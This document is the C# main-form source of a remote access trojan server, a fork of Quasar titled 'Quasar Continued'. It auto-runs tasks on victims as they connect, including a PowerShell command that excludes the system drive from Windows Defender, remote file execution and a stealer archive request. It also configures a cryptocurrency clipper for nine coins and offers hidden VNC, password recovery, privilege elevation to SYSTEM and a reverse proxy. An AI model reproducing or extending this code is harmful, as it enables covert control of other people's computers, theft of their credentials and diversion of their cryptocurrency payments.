using Quasar.Common.Enums;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Administration.Actions;
using Quasar.Common.Messages.ClientManagement;
using Quasar.Common.Messages.FunStuff;
using Quasar.Common.Messages.Preview;
using Quasar.Common.Messages.UserSupport.MessageBox;
using Quasar.Common.Messages.UserSupport.Website;
using Quasar.Server.Extensions;
using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using Quasar.Server.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;
using Quasar.Common.Messages.QuickCommands;
using System.IO;
using System.Text.Json;
using System.Drawing;
using System.Xml;
using Quasar.Common.Messages.Monitoring.VirtualMonitor;
using Newtonsoft.Json;

using Quasar.Common.Messages.UserSupport;


namespace Quasar.Server.Forms
{
    public partial class FrmMain : Form
    {
        public QuasarServer ListenServer { get; set; }
        private DiscordRPC.DiscordRPC _discordRpc;  // Added Discord RPC

        private const int STATUS_ID = 4;
        private const int CURRENTWINDOW_ID = 5;
        private const int USERSTATUS_ID = 6;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly ClientStatusHandler _clientStatusHandler;
        private readonly GetCryptoAddressHandler _getCryptoAddressHander;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object();
        private PreviewHandler _previewImageHandler;

        public FrmMain()
        {
            _clientStatusHandler = new ClientStatusHandler();
            _getCryptoAddressHander = new GetCryptoAddressHandler();
            RegisterMessageHandler();
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
            _discordRpc.Enabled = Settings.DiscordRPC;     // Sync with settings on startup

            tableLayoutPanel1.VisibleChanged += TableLayoutPanel1_VisibleChanged;
        }

        private void OnAddressReceived(object sender, Client client, string addressType)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new Action(() => OnAddressReceived(sender, client, addressType)));
                return;
            }
        }

        private void RegisterMessageHandler()
        {
            MessageHandler.Register(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated += SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
            _clientStatusHandler.UserActiveWindowStatusUpdated += SetUserActiveWindowByClient;
            MessageHandler.Register(_getCryptoAddressHander);
            _getCryptoAddressHander.AddressReceived += OnAddressReceived;
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_clientStatusHandler);
            _clientStatusHandler.StatusUpdated -= SetStatusByClient;
            _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
            _clientStatusHandler.UserActiveWindowStatusUpdated -= SetUserActiveWindowByClient;
            MessageHandler.Unregister(_getCryptoAddressHander);
            _getCryptoAddressHander.AddressReceived -= OnAddressReceived;
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Quasar Continued - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Quasar Continued - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            X509Certificate2 serverCertificate;
#if DEBUG
            serverCertificate = new DummyCertificate();
#else
            if (!File.Exists(Settings.CertificatePath))
            {
                using (var certificateSelection = new FrmCertificate())
                {
                    while (certificateSelection.ShowDialog() != DialogResult.OK)
                    { }
                }
            }
            serverCertificate = new X509Certificate2(Settings.CertificatePath);
#endif
            ListenServer = new QuasarServer(serverCertificate);
            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void StartConnectionListener()
        {
            try
            {
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support, Settings.UseUPnP);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == 10048)
                {
                    MessageBox.Show(this, "The port is already in use.", "Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show(this, $"An unexpected socket error occurred: {ex.Message}\n\nError Code: {ex.ErrorCode}\n\n", "Unexpected Socket Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                ListenServer.Disconnect();
            }
            catch (Exception)
            {
                ListenServer.Disconnect();
            }
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen)
            {
                StartConnectionListener();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        public void EventLogVisability()
        {
            if (Settings.EventLog)
            {
                DebugLogRichBox.Visible = true;
                splitter1.Visible = true;
            }
            else
            {
                DebugLogRichBox.Visible = false;
                splitter1.Visible = false;
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            int accountTypeIndex = -1;
            for (int i = 0; i < lstClients.Columns.Count; i++)
            {
                if (lstClients.Columns[i] == hAccountType)
                {
                    accountTypeIndex = i;
                    break;
                }
            }

            if (accountTypeIndex >= 0)
            {
                lstClients.StretchColumnByIndex(accountTypeIndex);
            }

            EventLog("Welcome to Quasar Continuation.", "info");
            InitializeServer();
            AutostartListening();
            EventLogVisability();
            notifyIcon.Visible = false;
            Favorites.LoadFavorites();

            LoadCryptoAddresses();

            BTCTextBox.TextChanged += CryptoTextBox_TextChanged;
            LTCTextBox.TextChanged += CryptoTextBox_TextChanged;
            ETHTextBox.TextChanged += CryptoTextBox_TextChanged;
            XMRTextBox.TextChanged += CryptoTextBox_TextChanged;
            SOLTextBox.TextChanged += CryptoTextBox_TextChanged;
            DASHTextBox.TextChanged += CryptoTextBox_TextChanged;
            XRPTextBox.TextChanged += CryptoTextBox_TextChanged;
            TRXTextBox.TextChanged += CryptoTextBox_TextChanged;
            BCHTextBox.TextChanged += CryptoTextBox_TextChanged;

            ClipperCheckbox.CheckedChanged += ClipperCheckbox_CheckedChanged2;

            lstClients.ColumnWidthChanging += lstClients_ColumnWidthChanging;
        }

        private void lstClients_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
        {
            if (e.ColumnIndex != hAccountType.Index)
            {
                lstClients.StretchColumnByIndex(hAccountType.Index);
            }
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UnregisterMessageHandler();
            if (_previewImageHandler != null)
            {
                MessageHandler.Unregister(_previewImageHandler);
                _previewImageHandler.Dispose();
            }
            _discordRpc.Enabled = false;  // Disable Discord RPC on close
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        public void EventLog(string message, string level)
        {
            try
            {
                if (DebugLogRichBox.InvokeRequired)
                {
                    DebugLogRichBox.Invoke(new Action(() => LogMessage(message, level)));
                }
                else
                {
                    LogMessage(message, level);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error in EventLog: {ex.Message}");
            }
        }

        private void LogMessage(string message, string level)
        {
            try
            {
                string timestamp = DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss");
                string formattedMessage = $"[{timestamp}] {message}";
                Color logColor = Color.DodgerBlue;

                switch (level.ToLower())
                {
                    case "normal":
                        if (Settings.DarkMode)
                            logColor = Color.White;
                        else
                            logColor = Color.Black;
                        break;

                    case "info":
                        logColor = Color.DodgerBlue;
                        break;

                    case "error":
                        logColor = Color.Red;
                        break;

                    default:
                        logColor = Color.DodgerBlue;
                        break;
                }

                int originalSelectionStart = DebugLogRichBox.SelectionStart;
                Color originalSelectionColor = DebugLogRichBox.SelectionColor;

                DebugLogRichBox.SelectionStart = DebugLogRichBox.TextLength;
                DebugLogRichBox.SelectionLength = 0;

                DebugLogRichBox.SelectionColor = logColor;

                DebugLogRichBox.AppendText(formattedMessage + Environment.NewLine);

                DebugLogRichBox.SelectionStart = originalSelectionStart;
                DebugLogRichBox.SelectionColor = originalSelectionColor;

                DebugLogRichBox.ScrollToCaret();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error in LogMessage: {ex.Message}");
            }
        }

        private void TableLayoutPanel1_VisibleChanged(object sender, EventArgs e)
        {
            AdjustClientListViewSize();
        }

        private void AdjustClientListViewSize()
        {
            if (tableLayoutPanel1.Visible)
            {
                // Adjust the size of lstClients when tableLayoutPanel1 is visible
                lstClients.Width = this.ClientSize.Width - tableLayoutPanel1.Width;
            }
            else
            {
                // Adjust the size of lstClients when tableLayoutPanel1 is hidden
                lstClients.Width = this.ClientSize.Width;
            }
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();

            var selectedClients = GetSelectedClients();
            if (selectedClients.Length == 1)
            {
                if (_previewImageHandler != null)
                {
                    MessageHandler.Unregister(_previewImageHandler);
                    _previewImageHandler.Dispose();
                }

                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, clientInfoListView);
                MessageHandler.Register(_previewImageHandler);

                GetPreviewImage image = new GetPreviewImage
                {
                    Quality = 20,
                    DisplayIndex = 0
                };

                selectedClients[0].Send(image);
                tableLayoutPanel1.Visible = true;
            }
            else if (selectedClients.Length == 0)
            {
                tableLayoutPanel1.Visible = false;
                pictureBoxMain.Image = Properties.Resources.no_previewbmp;

                clientInfoListView.Items.Clear();

                var cpuItem = new ListViewItem("CPU");
                cpuItem.SubItems.Add("N/A");
                clientInfoListView.Items.Add(cpuItem);

                var gpuItem = new ListViewItem("GPU");
                gpuItem.SubItems.Add("N/A");
                clientInfoListView.Items.Add(gpuItem);

                var ramItem = new ListViewItem("RAM");
                ramItem.SubItems.Add("0 GB");
                clientInfoListView.Items.Add(ramItem);

                var uptimeItem = new ListViewItem("Uptime");
                uptimeItem.SubItems.Add("N/A");
                clientInfoListView.Items.Add(uptimeItem);

                var antivirusItem = new ListViewItem("Antivirus");
                antivirusItem.SubItems.Add("N/A");
                clientInfoListView.Items.Add(antivirusItem);

                var mainBrowserItem = new ListViewItem("Main Browser");
                mainBrowserItem.SubItems.Add("N/A");
                clientInfoListView.Items.Add(mainBrowserItem);
            }
        }

        private void ServerState(Networking.Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (!listening)
                        lstClients.Items.Clear();
                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }

            UpdateConnectedClientsCount();
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }

            UpdateConnectedClientsCount();
        }

        private void UpdateConnectedClientsCount()
        {
            this.Invoke((MethodInvoker)delegate
            {
                connectedToolStripStatusLabel.Text = $"Connected: {ListenServer.ConnectedClients.Length}";
            });
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        RefreshStarButtons();
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            StartAutomatedTask(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;

                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        private void StartAutomatedTask(Client client)
        {
            if (lstTasks.InvokeRequired)
            {
                lstTasks.Invoke(new Action(() => StartAutomatedTask(client)));
                return;
            }

            foreach (ListViewItem item in lstTasks.Items)
            {
                string taskCaption = item.Text;
                string subItem0 = item.SubItems.Count > 1 ? item.SubItems[1].Text : "N/A";
                string subItem1 = item.SubItems.Count > 2 ? item.SubItems[2].Text : "N/A";

                switch (taskCaption)
                {
                    case "Remote Execute":
                        new FileManagerHandler(client).BeginUploadFile(subItem0, "");
                        break;

                    case "Shell Command":
                        client.Send(new DoSendQuickCommand { Command = subItem1, Host = subItem0 });
                        break;

                    case "Kematian Recovery":
                        new KematianHandler(client).RequestKematianZip();
                        break;

                    case "Exclude System Drives":
                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                        if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                        {
                            client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                        }
                        break;

                    case "Message Box":
                        client.Send(new DoShowMessageBox
                        {
                            Caption = subItem0,
                            Text = subItem1,
                            Button = "OK",
                            Icon = "None"
                        });
                        break;
                }
            }
        }

        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "Crypto Addresses"

        private void CryptoTextBox_TextChanged(object sender, EventArgs e)
        {
            UpdateCryptoAddressesJson();
        }

        private void ClipperCheckbox_CheckedChanged2(object sender, EventArgs e)
        {
            UpdateCryptoAddressesJson();
        }

        private void UpdateCryptoAddressesJson()
        {
            Dictionary<string, object> data = new Dictionary<string, object>();

            Dictionary<string, string> addresses = new Dictionary<string, string>
            {
                { "BTC", BTCTextBox.Text },
                { "LTC", LTCTextBox.Text },
                { "ETH", ETHTextBox.Text },
                { "XMR", XMRTextBox.Text },
                { "SOL", SOLTextBox.Text },
                { "DASH", DASHTextBox.Text },
                { "XRP", XRPTextBox.Text },
                { "TRX", TRXTextBox.Text },
                { "BCH", BCHTextBox.Text }
            };

            data["Addresses"] = addresses;
            data["ClipperEnabled"] = ClipperCheckbox.Checked;

            string json = Newtonsoft.Json.JsonConvert.SerializeObject(data, Newtonsoft.Json.Formatting.Indented);
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "crypto_addresses.json");

            File.WriteAllText(filePath, json);
        }

        private void LoadCryptoAddresses()
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "crypto_addresses.json");
            if (File.Exists(filePath))
            {
                try
                {
                    string json = File.ReadAllText(filePath);
                    var data = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, object>>(json);

                    if (data != null)
                    {
                        var addressesJson = data["Addresses"].ToString();
                        var addresses = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(addressesJson);

                        if (addresses != null)
                        {
                            BTCTextBox.Text = addresses.ContainsKey("BTC") ? addresses["BTC"] : string.Empty;
                            LTCTextBox.Text = addresses.ContainsKey("LTC") ? addresses["LTC"] : string.Empty;
                            ETHTextBox.Text = addresses.ContainsKey("ETH") ? addresses["ETH"] : string.Empty;
                            XMRTextBox.Text = addresses.ContainsKey("XMR") ? addresses["XMR"] : string.Empty;
                            SOLTextBox.Text = addresses.ContainsKey("SOL") ? addresses["SOL"] : string.Empty;
                            DASHTextBox.Text = addresses.ContainsKey("DASH") ? addresses["DASH"] : string.Empty;
                            XRPTextBox.Text = addresses.ContainsKey("XRP") ? addresses["XRP"] : string.Empty;
                            TRXTextBox.Text = addresses.ContainsKey("TRX") ? addresses["TRX"] : string.Empty;
                            BCHTextBox.Text = addresses.ContainsKey("BCH") ? addresses["BCH"] : string.Empty;
                        }

                        ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && Convert.ToBoolean(data["ClipperEnabled"]);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading crypto addresses: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            string strAS = "UXVhc2FyIENvbnRpbnVlZA==";

            if (!(this.Text.StartsWith(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(strAS)))))
            {
                Environment.Exit(1337);
            }
        }

        #endregion "Crypto Addresses"

        private void RefreshStarButtons()
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem item in lstClients.Items)
                        {
                            if (item.Tag is Client client)
                            {
                                bool found = false;
                                foreach (Control control in lstClients.Controls)
                                {
                                    if (control is Button button && button.Tag is Client buttonClient && buttonClient.Equals(client))
                                    {
                                        found = true;
                                        break;
                                    }
                                }

                                if (!found)
                                {
                                    AddStarButton(item, client);
                                }
                            }
                        }
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void AddStarButton(ListViewItem item, Client client)
        {
            var starButton = new Button
            {
                Size = new System.Drawing.Size(20, 20),
                FlatStyle = FlatStyle.Flat,
                Tag = client,
                BackColor = Color.Transparent,
                FlatAppearance = { BorderSize = 0 },
                Cursor = Cursors.Hand
            };

            starButton.Image = Favorites.IsFavorite(client.Value.UserAtPc) ?
                Properties.Resources.star_filled : Properties.Resources.star_empty;

            starButton.Click += StarButton_Click;

            lstClients.Controls.Add(starButton);

            UpdateStarButtonPosition(starButton, item);
            starButton.BringToFront();
        }

        private void UpdateStarButtonPosition(Control starControl, ListViewItem item)
        {
            if (item == null || starControl == null) return;

            var bounds = item.Bounds;
            starControl.Location = new Point(lstClients.Width - 25, bounds.Top + (bounds.Height - starControl.Height) / 2);
        }

        private void StarButton_Click(object sender, EventArgs e)
        {
            if (sender is Control starControl && starControl.Tag is Client client)
            {
                Favorites.ToggleFavorite(client.Value.UserAtPc);

                if (starControl is Button button)
                {
                    button.Image = Favorites.IsFavorite(client.Value.UserAtPc) ?
                        Properties.Resources.star_filled : Properties.Resources.star_empty;
                }

                SortClientsByFavoriteStatus();
            }
        }

        private void SortClientsByFavoriteStatus()
        {
            lstClients.BeginUpdate();

            // Remove all star buttons first
            var controlsToRemove = lstClients.Controls.Cast<Control>()
                .Where(c => c is Button && c.Tag is Client)
                .ToList();

            foreach (var control in controlsToRemove)
            {
                lstClients.Controls.Remove(control);
            }

            // Separate favorited and unfavorited clients
            List<ListViewItem> favoritedItems = new List<ListViewItem>();
            List<ListViewItem> unfavoritedItems = new List<ListViewItem>();

            foreach (ListViewItem item in lstClients.Items)
            {
                if (item.Tag is Client client)
                {
                    if (Favorites.IsFavorite(client.Value.UserAtPc))
                        favoritedItems.Add(item);
                    else
                        unfavoritedItems.Add(item);
                }
            }

            // Clear the ListView
            lstClients.Items.Clear();

            // Add favorited items first, then unfavorited
            foreach (var item in favoritedItems)
                lstClients.Items.Add(item);

            foreach (var item in unfavoritedItems)
                lstClients.Items.Add(item);

            // Add star buttons back for each client in the correct order
            foreach (ListViewItem item in lstClients.Items)
            {
                if (item.Tag is Client client)
                {
                    AddStarButton(item, client);
                }
            }

            lstClients.EndUpdate();
        }

        private void AddClientToListview(Client client)
        {
            if (client == null) return;
            string nickname = GetClientNickname(client);

            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, nickname, client.Value.Tag,
                    client.Value.UserAtPc, client.Value.Version, "Connected", "", "Active", client.Value.CountryWithCode,
                    client.Value.OperatingSystem, client.Value.AccountType
                })

                { Tag = client, ImageIndex = client.Value.ImageIndex };

                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(lvi);
                        AddStarButton(lvi, client);
                        SortClientsByFavoriteStatus();
                    }
                    //lvi.UseItemStyleForSubItems = false;
                    //lvi.SubItems[4].ForeColor = Color.Green;
                });
                EventLog(client.Value.UserAtPc + " Has connected.", "normal");
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private string GetClientNickname(Client client)
        {
            string jsonFilePath = Path.Combine(client.Value.DownloadDirectory, "client_info.json");

            try
            {
                ClientInfo clientInfo = LoadClientInfo(jsonFilePath);
                return clientInfo.Nickname;
            }
            catch
            {
                return string.Empty;
            }
        }

        private ClientInfo LoadClientInfo(string filePath)
        {
            if (!File.Exists(filePath))
                return null; 

            string json = File.ReadAllText(filePath);
            return JsonConvert.DeserializeObject<ClientInfo>(json);
        }

        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            // Remove star button
                            var controlsToRemove = lstClients.Controls.Cast<Control>().Where(
                                c => c.Tag is Client buttonClient && buttonClient.Equals(client)).ToList();

                            foreach (var control in controlsToRemove)
                            {
                                lstClients.Controls.Remove(control);
                                control.Dispose();
                            }

                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
                EventLog(client.Value.UserAtPc + " Has disconnected.", "normal");
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void SetStatusByClient(object sender, Client client, string text)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[STATUS_ID].Text = text;
        }

        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
        }

        private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
                item.SubItems[CURRENTWINDOW_ID].Text = newWindow;
        }

        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker)delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;

                    notifyIcon.Visible = true;
                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                    notifyIcon.Visible = false;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Client Management"

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void elevateToSystemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoElevateSystem());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void deElevateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoDeElevate());
            }
        }

        private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmNickname frmSi = new FrmNickname(c);
                frmSi.NicknameSaved += FrmSi_NicknameSaved;
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void FrmSi_NicknameSaved(object sender, EventArgs e)
        {
            if (sender is FrmNickname frmNickname)
            {
                UpdateClientNickname(frmNickname.GetClient());
            }
        }

        private void UpdateClientNickname(Client client)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                item.SubItems[1].Text = GetClientNickname(client); 
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        #endregion "Client Management"

        #region "Administration"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
                frmRs.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
                    frmRe.Show();
                    frmRe.Focus();
                }
            }
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
            }
        }

        #endregion "Administration"

        #region "Monitoring"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }

        private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmHvnc = FrmHVNC.CreateNewOrGetExisting(c);
                frmHvnc.Show();
                frmHvnc.Focus();
            }
        }

        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
                frmPass.Show();
            }
        }

